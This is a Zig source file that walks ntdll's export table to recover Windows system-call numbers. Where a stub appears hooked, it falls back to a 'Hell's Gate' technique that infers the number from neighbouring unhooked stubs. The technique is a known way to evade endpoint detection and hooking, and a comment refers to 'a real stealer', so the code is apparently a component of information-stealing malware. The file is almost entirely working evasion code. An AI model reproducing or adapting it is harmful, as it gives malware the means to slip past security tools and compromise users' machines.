const std = @import("std");

fn readCString(addr: usize) []const u8 {
    var len: usize = 0;
    while (@as(*u8, @ptrFromInt(addr + len)).* != 0) : (len += 1) {}
    return @as([*]const u8, @ptrFromInt(addr))[0..len];
}

pub fn extractSSN(func_addr: usize, ntdll_base: usize, export_dir: usize, export_dir_size: usize) u16 {
    const b0 = @as(*u8, @ptrFromInt(func_addr)).*;
    const b1 = @as(*u8, @ptrFromInt(func_addr + 1)).*;
    const b2 = @as(*u8, @ptrFromInt(func_addr + 2)).*;
    const b3 = @as(*u8, @ptrFromInt(func_addr + 3)).*;

    // Check for standard syscall stub:
    // 4C 8B D1 B8 (mov r10, rcx; mov eax, SSN)
    if (b0 == 0x4C and b1 == 0x8B and b2 == 0xD1 and b3 == 0xB8) {
        return @as(*align(1) u16, @ptrFromInt(func_addr + 4)).*;
    }

    // If hooked, fallback to Hell's Gate approach
    return hellsGate(func_addr, ntdll_base, export_dir, export_dir_size);
}

const FuncEntry = struct {
    addr: usize,
    ssn: u16,
};

fn hellsGate(hooked_addr: usize, ntdll_base: usize, export_dir: usize, export_dir_size: usize) u16 {
    _ = export_dir_size; // unused parameter suppression

    const num_names = @as(*u32, @ptrFromInt(export_dir + 0x18)).*;
    const addr_of_names = ntdll_base + @as(*u32, @ptrFromInt(export_dir + 0x20)).*;
    const addr_of_functions = ntdll_base + @as(*u32, @ptrFromInt(export_dir + 0x1C)).*;
    const addr_of_name_ordinals = ntdll_base + @as(*u32, @ptrFromInt(export_dir + 0x24)).*;

    // In a real stealer, we wouldn't allocate memory. We will just find the closest UP and closest DOWN.
    var closest_up_addr: usize = 0;
    var closest_up_ssn: u16 = 0;
    var min_diff_up: usize = std.math.maxInt(usize);

    var closest_down_addr: usize = 0;
    var closest_down_ssn: u16 = 0;
    var min_diff_down: usize = std.math.maxInt(usize);

    for (0..num_names) |i| {
        const name_rva = @as(*u32, @ptrFromInt(addr_of_names + i * 4)).*;
        const name_ptr = ntdll_base + name_rva;
        const name = readCString(name_ptr);

        if (name.len < 3 or name[0] != 'N' or name[1] != 't') {
            continue;
        }

        const ordinal = @as(*u16, @ptrFromInt(addr_of_name_ordinals + i * 2)).*;
        const func_rva = @as(*u32, @ptrFromInt(addr_of_functions + ordinal * 4)).*;
        const func_addr = ntdll_base + func_rva;

        const b0 = @as(*u8, @ptrFromInt(func_addr)).*;
        const b1 = @as(*u8, @ptrFromInt(func_addr + 1)).*;
        const b2 = @as(*u8, @ptrFromInt(func_addr + 2)).*;
        const b3 = @as(*u8, @ptrFromInt(func_addr + 3)).*;

        if (b0 == 0x4C and b1 == 0x8B and b2 == 0xD1 and b3 == 0xB8) {
            const ssn = @as(*align(1) u16, @ptrFromInt(func_addr + 4)).*;
            
            if (func_addr < hooked_addr) {
                const diff = hooked_addr - func_addr;
                if (diff < min_diff_up and diff <= 0x1000) {
                    min_diff_up = diff;
                    closest_up_addr = func_addr;
                    closest_up_ssn = ssn;
                }
            } else if (func_addr > hooked_addr) {
                const diff = func_addr - hooked_addr;
                if (diff < min_diff_down and diff <= 0x1000) {
                    min_diff_down = diff;
                    closest_down_addr = func_addr;
                    closest_down_ssn = ssn;
                }
            }
        }
    }

    if (min_diff_up < min_diff_down) {
        const stub_count = min_diff_up / 32;
        return closest_up_ssn + @as(u16, @intCast(stub_count));
    } else if (min_diff_down < std.math.maxInt(usize)) {
        const stub_count = min_diff_down / 32;
        if (closest_down_ssn > stub_count) {
             return closest_down_ssn - @as(u16, @intCast(stub_count));
        }
    }

    return 0;
}

pub fn resolveSingleSSN(base: usize, func_name: []const u8) u16 {
    if (base == 0) return 0;

    const e_lfanew = @as(*u32, @ptrFromInt(base + 0x3C)).*;
    const nt_headers = base + e_lfanew;

    const sig = @as(*u32, @ptrFromInt(nt_headers)).*;
    if (sig != 0x4550) return 0; // "PE\0\0"

    const optional_header = nt_headers + 0x18;
    // Magic: 0x10b (PE32) vs 0x20b (PE32+)
    // 64-bit windows uses 0x20b. Assuming 64-bit for now as the offsets were 64-bit in Go.
    const export_dir_rva = @as(*u32, @ptrFromInt(optional_header + 0x70)).*;
    const export_dir_size = @as(*u32, @ptrFromInt(optional_header + 0x74)).*;

    if (export_dir_rva == 0) return 0;

    const export_dir = base + export_dir_rva;
    const num_names = @as(*u32, @ptrFromInt(export_dir + 0x18)).*;
    const addr_of_names = base + @as(*u32, @ptrFromInt(export_dir + 0x20)).*;
    const addr_of_functions = base + @as(*u32, @ptrFromInt(export_dir + 0x1C)).*;
    const addr_of_name_ordinals = base + @as(*u32, @ptrFromInt(export_dir + 0x24)).*;

    for (0..num_names) |i| {
        const name_rva = @as(*u32, @ptrFromInt(addr_of_names + i * 4)).*;
        const name_ptr = base + name_rva;
        const name = readCString(name_ptr);

        if (std.mem.eql(u8, name, func_name)) {
            const ordinal = @as(*u16, @ptrFromInt(addr_of_name_ordinals + i * 2)).*;
            const func_rva = @as(*u32, @ptrFromInt(addr_of_functions + ordinal * 4)).*;
            const func_addr = base + func_rva;
            return extractSSN(func_addr, base, export_dir, export_dir_size);
        }
    }

    return 0;
}
